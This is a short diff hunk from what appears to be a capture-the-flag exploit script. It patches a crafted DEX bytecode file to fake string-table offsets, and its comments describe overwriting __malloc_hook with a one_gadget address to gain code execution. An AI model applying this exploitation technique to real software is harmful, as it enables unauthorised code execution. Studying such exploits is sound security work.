@@ -103,9 +103,23 @@ rawdata = patch(rawdata, pc, add(0, 0, 17))     # v0 now stores the new offset o
 pc += 4
 
 # Before we patch the StringIds, we need to do a few setups to fake all the offsets/strings we need later
+# We need to patch 4 bytes of __malloc_hook to one_gadget, and more for Array to index, so we can do online
+# patching
+for i in range(12):
+    rawdata = patch(rawdata, pc, newint(3, 0x26a + i*4))
+    pc += 6
+    rawdata = patch(rawdata, pc, iput(3, 1, 1+i))     # string 1-12: "22" - "33" : offset to index string
+    pc += 4                                           # "38" - "49" placing fake string data
+
+for i in range(4):                      # setup the new string offset, new id 12 - 15
+    rawdata = patch(rawdata, pc, newint(3, 0x1018 + (38+i)*4))
+    pc += 6
+    rawdata = patch(rawdata, pc, iput(3, 1, 0xd+i))
+    pc += 4
 
 rawdata = patch(rawdata, pc, iput(0, 2, 0))     # patch StringIds pointer to Array area
 pc += 4
+
 
 
 # Patch Checksum
